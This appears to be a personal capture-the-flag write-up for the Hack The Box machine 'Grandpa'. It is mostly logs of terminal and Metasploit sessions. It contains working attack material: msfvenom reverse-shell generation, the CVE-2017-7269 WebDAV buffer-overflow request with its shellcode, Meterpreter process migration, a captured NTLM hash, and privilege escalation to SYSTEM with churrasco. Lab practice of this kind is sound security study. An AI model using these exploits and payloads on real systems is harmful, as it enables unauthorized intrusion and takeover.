# Grandpa
| Category | |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Name | Grandpa |
| Target IP(s) | 10.129.146.35 |
| Foothold |  |
| PrivEsc | |
| Tech | |
| Includes | OSCP-Prep |

 
## Service scan
Full TCP scan
```

```

Full UDP scan
```

```

Specific TCP port scan
```

```


```
└─$ searchsploit iis 6.0 
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Intern | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remo | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion De | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of S | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustio | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remo | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypas | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypas | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypas | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypas | windows/remote/8806.pl
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabiliti | windows/remote/19033.txt
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

google search for 
```
CVE-2017-7269 github
```

```
https://github.com/danigargu/explodingcan/blob/master/explodingcan.py
```

```
└─$ git clone https://github.com/danigargu/explodingcan.git                                              1 ⨯
Cloning into 'explodingcan'...
remote: Enumerating objects: 13, done.
remote: Total 13 (delta 0), reused 0 (delta 0), pack-reused 13
Receiving objects: 100% (13/13), 6.31 KiB | 6.31 MiB/s, done.
Resolving deltas: 100% (2/2), done.
                                                                                                             
└─$ cd explodingcan 
                                                                                                             
└─$ msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.17.226 LPORT=1234 >shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 769 (iteration=0)
x86/alpha_mixed chosen with final size 769
Payload size: 769 bytes
```

Shell was not stable, and died directly after executed.

```
└─$ msfconsole                                                                   1 ⚙
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > search iis 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/firewall/blackice_pam_icq            2004-03-18       great   No     ISS PAM.dll ICQ Parser Buffer Overflow
   1  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   2  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with
                                             syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.183.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.17.226
LHOST => 10.10.17.226
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.129.146.35
RHOSTS => 10.129.146.35
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.17.226:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.129.146.35
[*] Meterpreter session 1 opened (10.10.17.226:4444 -> 10.129.146.35:1037) at 2021-07-18 01:16:53 -0400

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

Search for a process running with the same user.

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 268   4     smss.exe
 324   268   csrss.exe
 348   268   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 600   396   svchost.exe
 680   396   svchost.exe
 740   396   svchost.exe
 768   396   svchost.exe
 804   396   svchost.exe
 1000  396   spoolsv.exe
 1028  396   msdtc.exe
 1104  396   cisvc.exe
 1140  1104  cidaemon.exe
 1148  396   svchost.exe
 1208  396   inetinfo.exe
 1256  396   svchost.exe
 1360  396   VGAuthService.exe
 1408  1104  cidaemon.exe
 1412  396   vmtoolsd.exe
 1480  396   svchost.exe
 1672  396   svchost.exe
 1744  1104  cidaemon.exe
 1812  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1860  396   dllhost.exe
 1932  396   alg.exe
 2028  348   logon.scr
 2564  600   wmiprvse.exe
 3172  3700  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3700  1480  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3820  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe

meterpreter > migrate 3700
[*] Migrating from 3172 to 3700...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > run
[-] Post failed: Msf::OptionValidateError One or more options failed to validate: SESSION.
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.146.35 - Collecting local exploits for x86/windows...
[*] 10.129.146.35 - 38 exploit checks are being tried...
[+] 10.129.146.35 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.146.35 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.146.35 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.146.35 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.146.35 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.146.35 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.146.35 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.183.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2


msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost 10.10.17.226
lhost => 10.10.17.226
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.10.17.226:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (175174 bytes) to 10.129.146.35
[-] Meterpreter session 2 is not valid and will be closed
[*] 10.129.146.35 - Meterpreter session 2 closed.

^C[*] Exploit completed, but no session was created.

```

Did not open a shell. (maybe 2nd try?)




```
└─$ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git         
Cloning into 'iis6-exploit-2017-CVE-2017-7269'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Receiving objects: 100% (6/6), done.
                                                                                               
└─$ cd iis6-exploit-2017-CVE-2017-7269
                                                                                               
┌──(kali㉿kali)-[~/htb/iis6-exploit-2017-CVE-2017-7269]
└─$ ls                                                                             'iis6 reverse shell'   README.md
                                                                                               
┌──(kali㉿kali)-[~/htb/iis6-exploit-2017-CVE-2017-7269]
└─$ mv 'iis6 reverse shell' reverseShell.py                   
                                                                                               
┌──(kali㉿kali)-[~/htb/iis6-exploit-2017-CVE-2017-7269]
└─$ python2 reverseShell.py                                                       
usage:iis6webdav.py targetip targetport reverseip reverseport


└─$ python2 reverseShell.py 10.129.146.35 80 10.10.17.226 1234 
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

Hint: Looks like you can run this script only once. In case the shell dies somehow, you need to restart the target machine.


```
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.146.35] 1039
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>

```

```
c:\windows\system32\inetsrv>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\

04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  05:32 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:18 PM    <DIR>          Program Files
12/24/2017  08:27 PM    <DIR>          WINDOWS
04/12/2017  05:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)  17,935,269,888 bytes free

C:\>cd wmpub	
cd wmpub

C:\wmpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\wmpub

04/12/2017  05:05 PM    <DIR>          .
04/12/2017  05:05 PM    <DIR>          ..
04/12/2017  05:05 PM    <DIR>          wmiislog
               0 File(s)              0 bytes
               3 Dir(s)  17,935,269,888 bytes free

C:\wmpub>echo test > test
echo test > test

C:\wmpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\wmpub

07/18/2021  08:49 AM    <DIR>          .
07/18/2021  08:49 AM    <DIR>          ..
07/18/2021  08:49 AM                 7 test
04/12/2017  05:05 PM    <DIR>          wmiislog
               1 File(s)              7 bytes
               3 Dir(s)  17,935,265,792 bytes free

C:\wmpub>type test
type test
test 

C:\wmpub>icacls
icacls

C:\wmpub>icacls .
icacls .
. BUILTIN\Administrators:(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(AD)
  BUILTIN\Users:(I)(CI)(WD)

Successfully processed 1 files; Failed processing 0 files

```

description icacls line by line
```
From the [Microsoft Article on ICACLS](http://technet.microsoft.com/en-us/library/cc753525%28WS.10%29.aspx)

The entries are users and groups specific to that file (DOMAIN\USER or GROUP), the permissions listed are as follows:

> SIDs may be in either numerical or friendly name form. If you use a numerical form, affix the wildcard character * to the beginning of the SID.
> 
> **icacls** preserves the canonical order of ACE entries as:
> 
> -   Explicit denials
> -   Explicit grants
> -   Inherited denials
> -   Inherited grants
> 
> _Perm_ is a permission mask that can be specified in one of the following forms:
> 
> 1.  A sequence of simple rights:
>     -   **F** (full access)
>     -   **M** (modify access)
>     -   **RX** (read and execute access)
>     -   **R** (read-only access)
>     -   **W** (write-only access)
> 2.  A comma-separated list in parenthesis of specific rights:
>     -   **D** (delete)
>     -   **RC** (read control)
>     -   **WDAC** (write DAC)
>     -   **WO** (write owner)
>     -   **S** (synchronize)
>     -   **AS** (access system security)
>     -   **MA** (maximum allowed)
>     -   **GR** (generic read)
>     -   **GW** (generic write)
>     -   **GE** (generic execute)
>     -   **GA** (generic all)
>     -   **RD** (read data/list directory)
>     -   **WD** (write data/add file)
>     -   **AD** (append data/add subdirectory)
>     -   **REA** (read extended attributes)
>     -   **WEA** (write extended attributes)
>     -   **X** (execute/traverse)
>     -   **DC** (delete child)
>     -   **RA** (read attributes)
>     -   **WA** (write attributes)
> 
> Inheritance rights may precede either _Perm_ form, and they are applied only to directories:
> 
> -   **(OI)**: object inherit
> -   **(CI)**: container inherit
> -   **(IO)**: inherit only
> -   **(NP)**: do not propagate inherit
> -   **(I)**: permission inherited from parent container

---

For files, the permission masks are more or less self-explanatory: `R` means you can read the file, `X` allows it to be executed (as a program), and so on.

For other kinds of objects, you will have to browse MSDN:

-   [Standard Access Rights](http://msdn.microsoft.com/en-us/library/aa379607%28v=VS.85%29.aspx)
-   [ACE Inheritance Rules](http://msdn.microsoft.com/en-us/library/aa374924%28v=VS.85%29.aspx)
-   [Registry](http://msdn.microsoft.com/en-us/library/ms724878%28v=vs.85%29.aspx)
-   [Service](http://msdn.microsoft.com/en-us/library/ms685981%28v=vs.85%29.aspx)
-   ...

Inheritance rights in English:

-   `(I)` "Inherited": This ACE was inherited from the parent container.
-   `(OI)` "Object inherit": This ACE will be inherited by objects placed in this container.
-   `(CI)` "Container inherit": This ACE will be inherited by subcontainers placed in this container.
-   `(IO)` "Inherit only": This ACE will be inherited (see `OI` and `CI`), but does not apply to this object itself.
-   `(NP)` "Do not propagate": This ACE will be inherited by objects and subcontainers _one level deep_ – it will not apply to things inside subcontainers.

For the file system, "container" means a folder and "object" means a file, but remember that ACLs can be set on many other kinds of objects, not all of which have a concept of "containers".

```

```

```


```

```


```

```



```
└─$ nc -nlvp 1234                                                            
listening on [any] 1234 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.2.85] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-297-2947634-44968
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 1 Minutes, 6 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 810 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,343 MB
Page File: In Use:         127 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

TODO: run  Windows-Exploit-Suggester/

```
┌──(kali㉿kali)-[~/htb/wesng]
└─$ python3 wes.py ../sysinfo.txt -s critical > output.txt
```

```
┌──(kali㉿kali)-[~/…/git/BammBammSec/PenetrationTesting/exploits]
└─$ locate smbserver.py
/home/kali/PycharmProjects/pythonProject/venv/bin/smbserver.py
/home/kali/PycharmProjects/pythonProject/venv/lib/python3.9/site-packages/impacket/smbserver.py
/usr/lib/python3/dist-packages/impacket/smbserver.py
/usr/share/doc/python3-impacket/examples/smbserver.py
                                                                             
┌──(kali㉿kali)-[~/…/git/BammBammSec/PenetrationTesting/exploits]
└─$ /usr/lib/python3/dist-packages/impacket/smbserver.py
zsh: permission denied: /usr/lib/python3/dist-packages/impacket/smbserver.py
                                                                             
┌──(kali㉿kali)-[~/…/git/BammBammSec/PenetrationTesting/exploits]
└─$ python3 /usr/lib/python3/dist-packages/impacket/smbserver.py       126 ⨯
                                                                             
┌──(kali㉿kali)-[~/…/git/BammBammSec/PenetrationTesting/exploits]
└─$ python3 /usr/lib/python3/dist-packages/impacket/smbserver.py share .

```


```
┌──(kali㉿kali)-[~/htb]
└─$ cp Churrasco/churrasco.exe share/
                                                                             
┌──(kali㉿kali)-[~/htb]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share share/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.174.181,1031)
[*] AUTHENTICATE_MESSAGE (\,GRANPA)
[*] User GRANPA\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (HTB\GRANPA$,GRANPA)
[*] User GRANPA\GRANPA$ authenticated successfully
[*] GRANPA$::HTB:0538c9880299086400000000000000000000000000000000:3418ea5874a48ff446218bc9a771e6f8bb6e4fedb3cb6758:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Closing down connection (10.129.174.181,1031)
[*] Remaining connections []

```

```
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.174.181] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\

04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  05:32 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:18 PM    <DIR>          Program Files
12/24/2017  08:27 PM    <DIR>          WINDOWS
04/12/2017  05:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)  18,098,176,000 bytes free

C:\>cd wmpub
cd wmpub

C:\wmpub>copy \\10.10.17.226\share\churrasco.exe churrasco.exe
copy \\10.10.17.226\share\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\wmpub>whoami
whoami
nt authority\network service

C:\wmpub>churrasco whoami
churrasco whoami
nt authority\system

C:\wmpub>churrasco cmd
churrasco cmd
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>cd \Documents and settings
cd \Documents and settings

C:\Documents and Settings>dir
dir

C:\wmpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\wmpub

07/18/2021  05:18 PM    <DIR>          .
07/18/2021  05:18 PM    <DIR>          ..
07/18/2021  05:14 PM            31,232 churrasco.exe
04/12/2017  05:05 PM    <DIR>          wmiislog
               1 File(s)         31,232 bytes
               3 Dir(s)  18,098,122,752 bytes free

C:\wmpub>cd \
cd \

C:\>cd "Documents and settings"
cd "Documents and settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)  18,098,122,752 bytes free

C:\Documents and Settings>type Administrator\Desktop\root.txt
9359e9**************************

C:\Documents and Settings>type harry\desktop\user.txt
bdff5e**************************

```



## Resources
* https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/grandpa-writeup-w-metasploit
* https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html
* https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
* https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item